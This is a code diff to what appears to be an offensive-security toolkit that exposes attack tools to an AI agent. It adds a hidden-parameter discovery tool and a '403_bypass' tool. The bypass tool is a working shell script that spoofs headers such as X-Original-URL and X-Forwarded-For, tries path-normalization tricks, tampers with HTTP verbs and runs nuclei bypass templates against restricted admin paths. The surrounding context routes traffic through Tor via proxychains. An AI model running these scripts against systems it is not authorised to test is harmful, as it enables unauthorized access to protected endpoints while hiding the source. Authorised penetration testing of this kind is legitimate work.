@@ -50,6 +50,21 @@ _NEW_TOOLS = {
             "version": {"type": "string"}
         }, "required": ["product"]}
     },
+    "param_discover": {
+        "description": "Hidden parameter discovery using arjun. Finds undocumented GET/POST parameters that the UI never sends but the backend still accepts — critical for finding ?admin=true, ?debug=1, ?role=admin, mass-assignment, and business logic bypass vectors.",
+        "input_schema": {"type": "object", "properties": {
+            "url":     {"type": "string", "description": "Target URL to probe for hidden parameters"},
+            "method":  {"type": "string", "description": "HTTP method: GET or POST (default: GET)"},
+            "wordlist":{"type": "string", "description": "Custom wordlist path (optional, uses arjun built-in by default)"}
+        }, "required": ["url"]}
+    },
+    "403_bypass": {
+        "description": "Header-based 403/401 access control bypass. Tests X-Original-URL, X-Rewrite-URL, X-Forwarded-For, X-Custom-IP-Authorization, path normalization tricks, and HTTP verb tampering to access restricted endpoints.",
+        "input_schema": {"type": "object", "properties": {
+            "target":   {"type": "string", "description": "Base URL of the target (e.g. https://target.com)"},
+            "path":     {"type": "string", "description": "Restricted path to bypass (default: /admin)"}
+        }, "required": ["target"]}
+    },
 }
 
 TOOLS = {
@@ -1643,6 +1658,50 @@ echo '--- IP via Tor ---' &&
 proxychains4 -q curl -s --max-time 10 https://ifconfig.me 2>&1"""
         else:
             return f"proxychains4 -f {shlex.quote(config)} -q {cmd} 2>&1 | head -80"
+
+    elif tool == "param_discover":
+        url     = shlex.quote(args.get('url', ''))
+        method  = args.get('method', 'GET').upper()
+        wl_arg  = f"-w {shlex.quote(args['wordlist'])}" if args.get('wordlist') else ''
+        return f"""echo '=== PARAMETER DISCOVERY: {args.get('url','')} ===' &&
+if command -v arjun &>/dev/null; then
+  arjun -u {url} -m {method} {wl_arg} --stable -q 2>&1 | head -80
+else
+  echo '[arjun not found] Falling back to manual probe...' &&
+  for P in id user_id uid account_id admin debug role isAdmin superuser token api_key access_token secret key auth bypass internal dev test preview mode view format output type action page limit offset sort order filter search q query callback redirect url next returnTo dest destination path file include lang locale version v platform source ref utm_source utm_medium; do
+    CODE_GET=$(curl -sk -o /tmp/_pd_get.txt -w '%{{http_code}}' -m 6 -G {url} --data-urlencode "$P=1" 2>/dev/null)
+    BODY=$(head -c 200 /tmp/_pd_get.txt 2>/dev/null)
+    [ "$CODE_GET" != '404' ] && [ "$CODE_GET" != '400' ] && [ -n "$BODY" ] && echo "[GET:$CODE_GET] ?$P=1 → $BODY"
+  done
+fi"""
+
+    elif tool == "403_bypass":
+        target  = args.get('target', '').rstrip('/')
+        path    = args.get('path', '/admin').lstrip('/')
+        qt      = shlex.quote(target)
+        return f"""echo '=== 403 BYPASS: {target}/{path} ===' &&
+ORIG=$(curl -sk -o /dev/null -w '%{{http_code}}' -m 8 {qt}/{path} 2>/dev/null)
+echo "Baseline: /{path} → HTTP $ORIG" &&
+echo '--- Header injection ---' &&
+for H in 'X-Original-URL: /{path}' 'X-Rewrite-URL: /{path}' 'X-Forwarded-For: 127.0.0.1' 'X-Remote-IP: 127.0.0.1' 'X-Remote-Addr: 127.0.0.1' 'X-Client-IP: 127.0.0.1' 'X-Real-IP: 127.0.0.1' 'X-Custom-IP-Authorization: 127.0.0.1' 'X-Host: localhost' 'X-Forwarded-Host: localhost' 'X-Originating-IP: 127.0.0.1' 'X-ProxyUser-Ip: 127.0.0.1'; do
+  CODE=$(curl -sk -o /dev/null -w '%{{http_code}}' -m 8 -H "$H" {qt}/{path} 2>/dev/null)
+  [ "$CODE" != "$ORIG" ] && echo "[BYPASS:$CODE] -H $H"
+done &&
+echo '--- Path normalization ---' &&
+for VAR in '{path}/.' '/{path}//' '//{path}' './{path}' '/{path}%20' '/{path}%09' '/{path}?' '/{path}#' '/{path}..;/' '/{path};.js' '/{path}/.;/'; do
+  CODE=$(curl -sk -o /dev/null -w '%{{http_code}}' -m 8 {qt}$VAR 2>/dev/null)
+  [ "$CODE" != "$ORIG" ] && echo "[BYPASS:$CODE] $VAR"
+done &&
+echo '--- HTTP verb tampering ---' &&
+for VERB in POST PUT PATCH DELETE OPTIONS TRACE HEAD; do
+  CODE=$(curl -sk -o /dev/null -w '%{{http_code}}' -m 8 -X $VERB {qt}/{path} 2>/dev/null)
+  [ "$CODE" != "$ORIG" ] && echo "[BYPASS:$CODE] -X $VERB"
+done &&
+echo '--- Content-Length 0 trick ---' &&
+CODE=$(curl -sk -o /dev/null -w '%{{http_code}}' -m 8 -H 'Content-Length: 0' -X POST {qt}/{path} 2>/dev/null)
+[ "$CODE" != "$ORIG" ] && echo "[BYPASS:$CODE] Content-Length: 0 POST"
+echo '--- nuclei 403 templates ---'
+nuclei -u {qt}/{path} -tags '403,bypass,misconfiguration' -severity critical,high,medium -no-color 2>&1 | head -20"""
 
     elif tool == "cve_rag_local":
         product = args.get('product', '')
